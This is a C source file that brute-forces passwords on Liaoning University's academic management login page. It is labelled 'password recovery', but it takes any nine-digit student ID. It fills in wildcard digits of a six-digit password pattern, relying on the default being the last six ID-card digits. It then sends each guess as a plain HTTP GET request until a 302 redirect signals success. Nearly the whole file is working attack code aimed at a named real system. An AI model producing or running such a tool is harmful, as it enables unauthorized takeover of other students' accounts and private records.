#include<winsock.h>
#include<string.h>
#include<stdio.h>
#include<conio.h>
#include<math.h>
#pragma comment(lib, "ws2_32.lib") 
int ShowLast(int last)
{/*标题栏实时显示剩余个数，若传入-1显示成功，传入-2显示失败*/
	char t[7] = {0};
	if (last == -1)
		SetConsoleTitle("Succeed");
	else if (last == -2)
		SetConsoleTitle("Fail");
	else
		SetConsoleTitle(_itoa(last,t,10));
	return 0;
}
/*char* QueryWebSite(char *stuid,char *pwd)
{/*根据传入的学号、密码，向教务管理登陆页面发送GET请求，成功则返回前20字节，否则返回空*/
/*	WSADATA WSAData={0}; 
	SOCKET sockinf; 
	struct sockaddr_in addr; 
	struct hostent *pURL; 
	char header[1024] = {0}; 
	char text[21] = {0}; 

	if (WSAStartup(MAKEWORD(2,2), &WSAData)) 
		return NULL;
	sockinf = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
	pURL = gethostbyname("jwgl.lnu.edu.cn"); 
	addr.sin_family = AF_INET; 
	addr.sin_addr.s_addr = *((unsigned long*)pURL->h_addr); 
	addr.sin_port = htons(80); 
	sprintf(header,"GET /pls/wwwbks/bks_login2.login?stuid=%s&pwd=%s HTTP/1.1\r\nHost: jwgl.lnu.edu.cn\r\nConnection: Close\r\n\r\n",stuid,pwd);
	connect(sockinf,(SOCKADDR *)&addr,sizeof(addr)); 
	send(sockinf, header, strlen(header), 0); 

	recv(sockinf, text, 20, 0);

	closesocket(sockinf); 
	WSACleanup(); 
	return text;
}*/
int CheckLogin(char *SiteInfo)
{/*根据传入的网页内容字符串判断本次尝试是否正确，若正确则返回1，否则返回0*/
	if (!strstr(SiteInfo,"302"))//失败情况
		return 0;
	return 1;
}
int CreatePwdList(char *pwd,char ***pwdList)
{/*生成待使用的密码表pwdList，返回密码表中密码个数*/
	register int i,ti,j,k=0,n=0,tnum=0;//通配符个数，待返回的密码个数
	int max,min;//能达到的最大数，基数
	int type=0;//type10:有最高位，type100:有最高位与次高位
	for (j=5;j>=0;j--)//计算type
	{
		if (pwd[j] == '?')//若是找到通配符，待计算位数+1
		{
			n++;
			if (j == 0 && pwd[j+1] != '?')//最高位为通配符
				type += 10;
			else if (j == 0 && pwd[j+1] == '?')//最高位与次高位为通配符
				type += 100;
		}
	}
	switch (type)
	{
	case 0:
		tnum = pow(10.0,n);
		max = tnum - 1;
		min = 0;
		break;
	case 10:
		tnum = 4 * pow(10.0,n-1);
		min = 0;
		max = 4 * pow(10.0,n-1) - 1;
		break;
	case 100:
		tnum = 31 * pow(10.0,n-2);
		min = pow(10.0,n-2);
		max = tnum + min - 1;
		break;
	default:
		break;
	}
	*pwdList = (char**)malloc(tnum*sizeof(char*));
	for (i=0;i<tnum;i++)
		(*pwdList)[i] = (char*)malloc(7*sizeof(char));//初始化密码表
	for (i=min;i<=max;i++)//填充密码表
	{
		strcpy((*pwdList)[k],pwd);
		ti = i;
		for (j=5;j>=0;j--)
		{
			if ((*pwdList)[k][j] == '?')
			{
				(*pwdList)[k][j] = ti % 10 + '0';
				ti /= 10;
			}
		}
		k++;
	}
	return tnum;
}

int CheckBegin(char *stuid,char *pwd)
{/*输入参数：	pwd(密码格式串)*/
	char **PwdList = NULL;//指向密码表
	char *sitebuf = NULL;//存放页面内容
	int tnum,PwdNum;//剩余密码个数，密码个数
	register int i,Ftime=0;

	/*套接字初始化部分*/
	int timeout = 60000;//超时1分钟
	int TimedOutFlag = 0;
	WSADATA WSAData={0}; 
	SOCKET sockinf; 
	struct sockaddr_in addr; 
	struct hostent *pURL; 
	char header[1024] = {0}; 
	char text[21] = {0}; 
	if (WSAStartup(MAKEWORD(2,2), &WSAData))
	{
		printf("\n\n套接字启动失败！\n");
		return 0;
	}
	pURL = gethostbyname("jwgl.lnu.edu.cn"); 
	if (!pURL)
	{
		printf("\n\n获得统一定位符失败！\n");
		return 0;
	}
	addr.sin_family = AF_INET; 
	addr.sin_addr.s_addr = *((unsigned long*)pURL->h_addr); 
	addr.sin_port = htons(80); 
	setsockopt(sockinf,SOL_SOCKET,SO_SNDTIMEO,(char*)&timeout,sizeof(int));//设置recv超时为1分钟

	tnum = PwdNum = CreatePwdList(pwd,&PwdList);//生成密码表并返回个数
	printf("\n共%d个待测试密码",PwdNum);
	for (i=0;i<PwdNum;i++)
	{
		/*套接字初始化与查询分离为了加速*/
		TimedOutFlag = 0;
		do
		{
			sockinf = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
			sprintf(header,"GET /pls/wwwbks/bks_login2.login?stuid=%s&pwd=%s HTTP/1.1\r\nHost: jwgl.lnu.edu.cn\r\nConnection: Close\r\n\r\n",stuid,PwdList[i]);
			connect(sockinf,(SOCKADDR *)&addr,sizeof(addr)); 
			send(sockinf,header,strlen(header),0); 
			if (recv(sockinf,text,20,0) == -1)//捕获到超时
				TimedOutFlag = 1;
			sitebuf = text;
			closesocket(sockinf);
		}while(TimedOutFlag);//上一次超时

		//sitebuf = QueryWebSite(stuid,PwdList[i]);//查询到的网页内容
		if (!sitebuf)//若为空，失败次数+1
		{
			if (Ftime < 10)
				Ftime++;
			else
			{
				Ftime = 0;
				if (IDNO == MessageBox(NULL,"网页请求失败次数达到10次，是否等待或是直接退出程序","Something wrong!",MB_YESNO))
				{
					printf("\n\n用户选择了终止程序！\n");
					break;//用户选择停止程序
				}
				i--;
			}
		}
		else
		{
			tnum--;
			ShowLast(tnum);//标题栏显示剩余密码个数
			if (CheckLogin(sitebuf))//登录成功，提示，退出循环
			{
				ShowLast(-1);
				printf("\n\n找到正确的密码！\nPwd = %s\n",PwdList[i]);
				break;
			}
		}
	}
	if (i == PwdNum)//所有情况全部尝试，没有找到正确的密码
	{
		ShowLast(-2);
		printf("\n\n密码表中无法找到正确的密码！\n");
	}
	for (i=0;i<PwdNum;i++)
		free(PwdList[i]);//释放内存
	
	WSACleanup();//清除套接字
	return 0;
}

int main()
{
	char stuid[10] = {0};//学号
	char pwd[7] = {0};//密码
	printf("辽宁大学综合教务管理系统登录密码找回\n--请保证未改过原始密码(身份证后六位)，否则无效\n--六位密码输入样例：1234??表示查找123400~123499\n--开始找回密码后标题栏将自动更新剩余尝试数\n\n");
	printf("输入九位学号：");
	gets_s(stuid,10);
	printf("输入六位密码：");
	gets_s(pwd,7);
	CheckBegin(stuid,pwd);//开始检查

	system("pause");
	
	return 0;
}